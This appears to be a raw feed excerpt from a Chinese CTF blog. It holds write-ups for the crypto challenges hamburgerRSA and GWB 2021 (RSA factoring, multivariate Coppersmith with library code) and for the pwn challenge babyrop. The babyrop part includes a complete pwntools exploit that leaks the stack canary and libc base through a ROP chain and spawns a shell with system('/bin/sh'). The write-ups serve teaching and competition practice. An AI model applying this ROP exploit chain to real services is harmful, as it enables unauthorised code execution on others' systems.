<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211212172340505.png" alt="image-20211212172340505"></p>
<p>不过偶尔的一次证明脚本继续上次断开的地方爆破的功能没有问题</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211212173333213.png" alt="image-20211212173333213"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211212173436293.png" alt="image-20211212173436293"></p>
<p>最后最后，此代码依旧不够健硕，因为遇到关键的网络问题无法滚回去，无法判断当前这个是因为对方或己方网络问题导致100s之后没有回显，还是真的没有回显（当然就算是手动爆破了也很难甄别WTF</p>
<h2 id="hamburgerRSA"><a href="#hamburgerRSA" class="headerlink" title="hamburgerRSA"></a>hamburgerRSA</h2><p>题目很短，核心代码如下，p和q都是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PP = <span class="built_in">int</span>(<span class="built_in">str</span>(p) + <span class="built_in">str</span>(p) + <span class="built_in">str</span>(q) + <span class="built_in">str</span>(q))</span><br><span class="line">QQ = <span class="built_in">int</span>(<span class="built_in">str</span>(q) + <span class="built_in">str</span>(q) + <span class="built_in">str</span>(p) + <span class="built_in">str</span>(p))</span><br><span class="line">n = PP * QQ</span><br></pre></td></tr></table></figure>

<p>之前有类似的</p>
<p><a href="https://4xwi11.github.io/posts/493b5ffc/#Crypto-babyrsa">https://4xwi11.github.io/posts/493b5ffc/#Crypto-babyrsa</a></p>
<p>注意是十进制，在二进制位上操作就错了</p>
<p>首先因为一些众所周知的原因：</p>
<ul>
<li>64位的p和q十进制要么是20位，要么是19位</li>
<li>十进制20位和20位相乘得到的结果要么是十进制40位，要么是39位</li>
<li>N=pq，N的前x位等于p的前y位乘以q的前y位，x略小于y一位或两位十进制位</li>
<li>同理N=pq，N的后x位等于p的后y位乘以q的后y位，x略小于y一位或两位十进制位</li>
</ul>
<p>（我随便搞几组同等大小的数据出来的结果，没有去搜严格的数学证明，可能是不准确的，但可以反映一定程度的现象</p>
<p>所以这里有n，我们可以知道n的前18位<code>177269125756508652</code>就是p和q相乘结果的前面，n的后18位<code>742722231922451193</code>同理，所以要爆破3~4位，再通过sage的factor函数来验证（保险点前后17位也不是不行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">part1 = <span class="string">&#x27;177269125756508652&#x27;</span></span><br><span class="line">part2 = <span class="string">&#x27;742722231922451193&#x27;</span></span><br><span class="line"><span class="keyword">for</span> part_mid <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    ans = part1 + <span class="built_in">str</span>(part_mid).rjust(<span class="number">3</span>, <span class="string">&#x27;0&#x27;</span>) + part2</span><br><span class="line">    ans = factor(<span class="built_in">int</span>(ans))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ans) == <span class="number">2</span> <span class="keyword">and</span> ans[<span class="number">0</span>][<span class="number">0</span>].nbits() == <span class="number">64</span>:</span><br><span class="line">        <span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211212151921171.png" alt="image-20211212151921171"></p>
<p>大概率就是正确接过来，最后是exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">    </span><br><span class="line">n = <span class="number">177269125756508652546242326065138402971542751112423326033880862868822164234452280738170245589798474033047460920552550018968571267978283756742722231922451193</span></span><br><span class="line">c = <span class="number">47718022601324543399078395957095083753201631332808949406927091589044837556469300807728484035581447960954603540348152501053100067139486887367207461593404096</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">9788542938580474429</span></span><br><span class="line">q = <span class="number">18109858317913867117</span></span><br><span class="line">PP = <span class="built_in">int</span>(<span class="built_in">str</span>(p) + <span class="built_in">str</span>(p) + <span class="built_in">str</span>(q) + <span class="built_in">str</span>(q))</span><br><span class="line">QQ = <span class="built_in">int</span>(<span class="built_in">str</span>(q) + <span class="built_in">str</span>(q) + <span class="built_in">str</span>(p) + <span class="built_in">str</span>(p))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, invert(<span class="number">0x10001</span>, n-PP-QQ+<span class="number">1</span>), PP*QQ)))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{f8d8bfa5-6c7f-14cb-908b-abc1e96946c6}</p>
</blockquote>
<p>所以何必求小根</p>
<h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><p>栈，挺考验综合性的，这次</p>
<ul>
<li>👴会用<code>gdb.attach</code>🌶</li>
<li>多看看栈说不定发现宝藏</li>
</ul>
<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>提供了libc-2.27.so</p>
<p>程序较短</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211212180622459.png" alt="image-20211212180622459"></p>
<p>保护除了pie全开</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211212181238528.png" alt="image-20211212181238528"></p>
<p>没有现成的<code>system</code>和<code>/bin/sh</code>，那就<code>ret2libc</code>，通过泄漏libc的基址来找<code>system</code>和<code>/bin/sh</code>，应该不是栈迁移（？</p>
<p><code>vul</code>函数里会有栈溢出，溢出48刚好到返回地址，并且可以利用父函数main的栈帧（第5点细说</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211212195727808.png" alt="image-20211212195727808"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211212202348709.png" alt="image-20211212202348709"></p>
<p>可能用到的几个gadget</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211212210149040.png" alt="image-20211212210149040"></p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>泄漏canary</li>
</ol>
<p>$\Rightarrow$2. 栈溢出跳转重新执行main函数</p>
<p>$\Rightarrow$3. 在name上构造ROP实现<code>puts(read_got)</code></p>
<p>$\Rightarrow$4. 栈溢出跳转到name执行ROP链</p>
<p>$\Rightarrow$5. 接收得到read真实地址算出libc基址并栈溢出跳转重新执行main函数</p>
<p>$\Rightarrow$6. 在name上构造ROP实现<code>system(&quot;/bin/sh&quot;)</code></p>
<p>$\Rightarrow$7. 栈溢出跳转到name执行ROP链</p>
<h4 id="1-泄漏canary"><a href="#1-泄漏canary" class="headerlink" title="1. 泄漏canary"></a>1. 泄漏canary</h4><p>这个比较简单，可以输入25个字符，但是题目故意不让用换行<code>0A</code>来填充，换一个字符就好</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">24</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;name[i], <span class="number">1uLL</span>) != <span class="number">1</span> || name[i] == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        name[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用IDA远程动调就很容易证明canary就紧跟在24长的name之后</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211212195352411.png" alt="image-20211212195352411"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211212195212702.png" alt="image-20211212195212702"></p>
<h4 id="2-栈溢出跳转重新执行main函数"><a href="#2-栈溢出跳转重新执行main函数" class="headerlink" title="2. 栈溢出跳转重新执行main函数"></a>2. 栈溢出跳转重新执行main函数</h4><p>因为<code>libc-2.27.so</code>的一些 🐱<code>bin</code>，有些时候可以跳转到<code>push rbp</code>继续执行，但有时候又必须越过<code>push rbp</code>直接跳转到<code>mov rbp, rsp</code></p>
<p>即这里第一次返回要返回到<code>0x40075C</code>，第二次则是返回到<code>0x40075B</code></p>
<p>可以多试几遍</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211213021920151.png" alt="image-20211213021920151"></p>
<h4 id="3-构造ROP实现puts-read-got"><a href="#3-构造ROP实现puts-read-got" class="headerlink" title="3. 构造ROP实现puts(read_got)"></a>3. 构造ROP实现<code>puts(read_got)</code></h4><p>64位用寄存器传参没什么好说的，<code>read</code>最好用<code>send</code>，这里结尾多加1字符变成25个字符</p>
<h4 id="4-栈溢出跳转到name执行ROP链"><a href="#4-栈溢出跳转到name执行ROP链" class="headerlink" title="4. 栈溢出跳转到name执行ROP链"></a>4. 栈溢出跳转到name执行ROP链</h4><p>注意，这里本来不会的，要用到父函数的栈帧</p>
<p>在name构造ROP之后，我们肯定想控制返回地址到这上去执行是吧，于是乎在这里打个断点，溢出还是继续溢出，返回地址先空着</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211213104858417.png" alt="image-20211213104858417"></p>
<p>单步执行直到<code>vul</code>的<code>ret</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211213110216701.png" alt="image-20211213110216701"></p>
<p>仔细查看下栈，发现宝藏了，<code>vul</code>返回到<code>main</code>之后距离我们构造的ROP只有16个字节，结合我们之前的可以pop两个寄存器的gadget<code>pop r14; pop r15; ret</code>，就可以来到我们的<code>name</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211213111045643.png" alt="image-20211213111045643"></p>
<p>最后这里贴张图致敬谢师傅Anza大哥，帮我速成pwn</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211213022309894.png" alt="image-20211213022309894"></p>
<h4 id="5-计算libc基址并栈溢出跳转重新执行main函数"><a href="#5-计算libc基址并栈溢出跳转重新执行main函数" class="headerlink" title="5. 计算libc基址并栈溢出跳转重新执行main函数"></a>5. 计算libc基址并栈溢出跳转重新执行main函数</h4><p>计算基址是基操，上文已经构造好了输出<code>read</code>函数真实地址的ROP链，现在接收一下就好了，以<code>\x7f</code>为标志</p>
<p>64位的libc地址开头都是<code>\x7f</code>，32位的都是<code>\xf7</code></p>
<p>之后正如上文所说的跳转到<code>0x40075B</code></p>
<h4 id="6-构造ROP实现system-quot-bin-sh-quot"><a href="#6-构造ROP实现system-quot-bin-sh-quot" class="headerlink" title="6. 构造ROP实现system(&quot;/bin/sh&quot;)"></a>6. 构造ROP实现<code>system(&quot;/bin/sh&quot;)</code></h4><p>dddd</p>
<h4 id="7-栈溢出跳转到name执行ROP链"><a href="#7-栈溢出跳转到name执行ROP链" class="headerlink" title="7. 栈溢出跳转到name执行ROP链"></a>7. 栈溢出跳转到name执行ROP链</h4><p>同上</p>
<p>完整的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch =<span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./babyrop&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;babyrop&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;123.56.122.14&quot;, 24091)</span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s : io.recvuntil(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : io.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : io.send(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s : io.recv(s)</span><br><span class="line">sa = <span class="keyword">lambda</span> r, s : io.sendlineafter(r, s)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line"></span><br><span class="line">show_me_pwd = <span class="string">b&quot;4196782&quot;</span></span><br><span class="line">main1_addr = <span class="number">0x40075C</span></span><br><span class="line">main2_addr = <span class="number">0x40075B</span></span><br><span class="line">puts_addr = <span class="number">0x40086E</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400913</span></span><br><span class="line">pop_r14_r15_ret = <span class="number">0x400910</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. leak canary</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">16</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;1&#x27;</span></span><br><span class="line">sd(payload1)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">canary = u64(rv(<span class="number">8</span>))- <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;canary ====&gt; &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&quot; unlock this challenge\n&quot;</span>, show_me_pwd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. ret2 main_mov_rbp_rsp</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span> + p64(canary) + p64(<span class="number">0</span>) + p64(main1_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sd(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. start from beginning &amp; puts(read)</span></span><br><span class="line"></span><br><span class="line">payload3 = p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;read&quot;</span>]) + p64(puts_addr) + <span class="string">b&#x27;1&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sd(payload3)</span><br><span class="line">sa(<span class="string">b&quot; unlock this challenge\n&quot;</span>, show_me_pwd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. ret2 name</span></span><br><span class="line"></span><br><span class="line">payload4 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_r14_r15_ret)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sd(payload4)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. leak libc_base &amp; ret2 main_push_ebp</span></span><br><span class="line">read_addr = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = read_addr - libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>.encode()))</span><br><span class="line">success(<span class="string">&quot;libc_base ===&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&quot;system_addr ===&gt; &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">success(<span class="string">&quot;bin_sh_addr ===&gt; &quot;</span> + <span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload5 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span> + p64(canary) + p64(<span class="number">0</span>) + p64(main2_addr)</span><br><span class="line">sd(payload5)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. start from beginning &amp; system(&quot;/bin/sh&quot;)</span></span><br><span class="line">payload6 = p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) + <span class="string">b&#x27;1&#x27;</span></span><br><span class="line">sd(payload6)</span><br><span class="line">sa(<span class="string">b&quot; unlock this challenge\n&quot;</span>, show_me_pwd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. ret2 name &amp; get shell</span></span><br><span class="line"></span><br><span class="line">payload7 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_r14_r15_ret)</span><br><span class="line">sd(payload7)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211213021545339.png" alt="image-20211213021545339"></p>
<p>到这里我</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211213023422685.png" alt="image-20211213023422685"></p>
]]></content>
      <categories>
        <category>树哥让我天天写之我就不</category>
      </categories>
  </entry>
  <entry>
    <title>20211206 GWBCrypto方向WP</title>
    <url>/posts/8b226326/</url>
    <content><![CDATA[<p>&nbsp;<span id="more"></span></p>
<h1 id="2021GWB"><a href="#2021GWB" class="headerlink" title="2021GWB"></a>2021GWB</h1><p>别人的省赛，一年几度的py大会，看看密码题吧</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>签到题没什么好说的，先base64解码得到的是题目代码，有两个不互素的指数，但公因子较小为3，共模攻击，最后开个3次根</p>
<blockquote>
<p>flag{e6e5722e-4b9a-11ec-b784-00155d9a1603}</p>
</blockquote>
<h3 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h3><h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><p>多元coppersmith</p>
<h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>两层，第一层已知p的高位，求hint，这个不说了，基础攻击，也许还要爆破几位；第二层已知两个数的高位，求解这两个数以及一个26位的随机数<code>r</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secreteBitNum = <span class="number">26</span></span><br><span class="line">target_bits = <span class="built_in">int</span>(<span class="number">256</span>)</span><br><span class="line">prime = getPrime(target_bits)</span><br><span class="line">s = randint(prime&gt;&gt;<span class="number">10</span>, prime)</span><br><span class="line">r = getrandbits(secreteBitNum)</span><br><span class="line">t = (r*(s^<span class="number">2</span> + <span class="number">2</span>*s)) % prime</span><br><span class="line">gifts = [<span class="number">3</span>, <span class="number">2</span>]</span><br><span class="line">ks = [floor(target_bits * (gift / (gift + <span class="number">1</span>))) <span class="keyword">for</span> gift <span class="keyword">in</span> gifts]</span><br><span class="line">leak1 = s &gt;&gt; (target_bits - ks[<span class="number">0</span>])</span><br><span class="line">leak2 = t &gt;&gt; (target_bits - ks[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p>这里ks是已知的，相当于leak1是s的高$\frac{3}{4}$位，leak2是t的高$\frac{2}{3}$位</p>
<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>很显然的coppersmith解小根，coppersmith构造两元，但是coppersmith求小根的函数太慢了，这里要跑出<code>r</code>，我一台机子要跑大约2400h，多线多台电脑程优化下或许可以，毕竟也有师傅这样做出来了</p>
<p>别的思路，有没有发现可以把<code>r</code>也当成小根，然后使用三元coppersmith，挖藕</p>
<p>直接上exp，附上类似的题目</p>
<p><a href="https://4xwi11.github.io/posts/493b5ffc/#Crypto-babyrsa">https://4xwi11.github.io/posts/493b5ffc/#Crypto-babyrsa</a></p>
<p><a href="https://4xwi11.github.io/posts/493b5ffc/#Crypto-babyrand%EF%BC%88recuring%EF%BC%89">https://4xwi11.github.io/posts/493b5ffc/#Crypto-babyrand（recuring）</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line">load(<span class="string">&quot;exploit/coppersmithSmallRoots.sage&quot;</span>)</span><br><span class="line">load(<span class="string">&quot;exploit/coppersmithPHighBits.sage&quot;</span>)</span><br><span class="line"></span><br><span class="line">get_flag = <span class="keyword">lambda</span> c, p, q: long_to_bytes(<span class="built_in">pow</span>(c, invert(e, p*q-p-q+<span class="number">1</span>), p*q))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get hint</span></span><br><span class="line">tmp_N = <span class="number">67275889677378946734903321404206582364153218707836044936581311977721676158433934674861722018390091292542128885311842688233567992017423854706617140651934525455990460080562308585391373661331461122947028205118969966760791488914164391921330229025670176008518053339148134137770309365614255463111202481834705060173</span></span><br><span class="line">cx = <span class="number">40399377632586118650556149454962332599993544072289982576457293479237148938553095258299197606759611718110458893982875730643146645623512300513916266262798465380752083932871857821720398540072426424439422364690204675516506456125988918985863308292449915493404572808822346197667419207669315093927318993921905479596</span></span><br><span class="line">pbar = <span class="number">4877155090632997781879191807827231697420271396210537080241322765167927413977000532975047982026915056</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p = known_hb(tmp_N, pbar, <span class="number">512</span>, i)</span><br><span class="line">    <span class="keyword">if</span> p:</span><br><span class="line">        q = tmp_N // p</span><br><span class="line">        <span class="built_in">print</span>(get_flag(cx, p, q))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">secreteBitNum = <span class="number">26</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag</span></span><br><span class="line">prime = <span class="number">82321753209337659641812698792368753307257174920293482309329229017641186204037</span></span><br><span class="line">c = <span class="number">4327179356609269294409009935591795772603625779675971467878490086808144060225614005300908314649047950861015994603326121468330956776913366179511247457747179889685304469999218104955814145411915021238933150884498316563808220329632240175418452382843973948334446343545955570063628905102384071000832724697885872043017030707897928</span></span><br><span class="line">N = <span class="number">43941665823196509154346632368475246193489316520677500866461851257383928558997955146720003171553041820199105630143274308184375615057136594812756966125202091119439909980006181740220827474838356621605513939553184451557022029987518161532780360148932769025277495283357745880781214097057768654158857096614016596756958574010574773</span></span><br><span class="line">leak1 = <span class="number">4392924728395269190263639346144303703257730516994610750658</span></span><br><span class="line">leak2 = <span class="number">838456777370923849008096179359487752850229097203212</span></span><br><span class="line"></span><br><span class="line">sbits = <span class="number">64</span></span><br><span class="line">tbits = <span class="number">86</span></span><br><span class="line">rbits = secreteBitNum</span><br><span class="line">s = leak1 &lt;&lt; sbits</span><br><span class="line">t = leak2 &lt;&lt; tbits</span><br><span class="line"></span><br><span class="line">Fp = Zmod(prime)</span><br><span class="line">PR.&lt;s0, t0, r0&gt; = PolynomialRing(Fp)</span><br><span class="line">f = r0 * ((s + s0) ^ <span class="number">2</span> + <span class="number">2</span> * (s + s0)) - (t + t0)</span><br><span class="line">roots = small_roots(f, (<span class="number">2</span>^sbits, <span class="number">2</span>^tbits, <span class="number">2</span>^rbits), <span class="number">2</span>)</span><br><span class="line">s += <span class="built_in">int</span>(roots[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">t += <span class="built_in">int</span>(roots[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">r = <span class="built_in">int</span>(roots[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">p = nextprime((s*(nextprime(s) * nextprime(r) + t)))</span><br><span class="line"><span class="keyword">if</span> N % p == <span class="number">0</span>:</span><br><span class="line">    q = N // p</span><br><span class="line">    <span class="built_in">print</span>(get_flag(c, p, q))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{bc33c490-4b95-11ec-ad04-00155d9a1603}</p>
</blockquote>
<p>最后整理两个库文件吧，方便之后用到</p>
<p>coppersmithSmallRoots.sage</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_roots</span>(<span class="params">f, bounds, m=<span class="number">2</span>, d=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">        base = N^(m-i) * f^i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span>/factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B*monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure>

<p>coppersmithPHighBits.sage</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">known_hb</span>(<span class="params">n, pbar, pbits, bb = <span class="number">0</span></span>):</span></span><br><span class="line">    <span class="comment"># pbar: p&#x27;s high bits</span></span><br><span class="line">    <span class="comment"># pbits: p&#x27;s original bit length</span></span><br><span class="line">    <span class="comment"># bb: bits for brute-force, default to zero</span></span><br><span class="line">    pbar = <span class="built_in">int</span>(<span class="built_in">hex</span>(pbar) + <span class="string">&#x27;0&#x27;</span> * bb, <span class="number">16</span>)    <span class="comment"># pbar &gt;&gt; p0bit &lt;&lt; p0bit then turn to hex with bb&#x27;s 0 padding for brute</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># brute 4*bb&#x27;s bits, i.e. 2 ^ (4 * bb)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">2</span> ^ (<span class="number">4</span> * bb))):</span><br><span class="line">        tp = pbar + i</span><br><span class="line">        p0bit = pbits - tp.bit_length()</span><br><span class="line">        Fn = Zmod(n)</span><br><span class="line">        PR.&lt;x&gt; = PolynomialRing(Fn)</span><br><span class="line">        tp &lt;&lt;= p0bit</span><br><span class="line">        f = tp + x</span><br><span class="line">        roots = f.small_roots(X=<span class="number">2</span>^p0bit, beta=<span class="number">0.4</span>)</span><br><span class="line">        <span class="keyword">if</span> roots:</span><br><span class="line">            p = tp + <span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>CopperSmith</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF密码学出题指北</title>
    <url>/posts/921543e1/</url>
    <content><![CDATA[<p>&nbsp;<span id="more"></span></p>
